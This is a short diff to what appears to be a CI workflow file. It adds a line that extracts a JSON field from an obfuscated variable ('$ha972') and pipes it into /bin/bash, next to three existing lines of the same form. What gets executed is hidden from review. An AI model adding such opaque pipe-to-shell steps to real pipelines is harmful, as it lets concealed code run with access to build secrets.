@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$zkr1" | jq -r .ns53 | /bin/bash
           printf '%s' "$dkhj4336" | jq -r .mzx79515 | /bin/bash
           printf '%s' "$k93316" | jq -r .pghr15961 | /bin/bash
+          echo $ha972 | jq -r .vb3 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
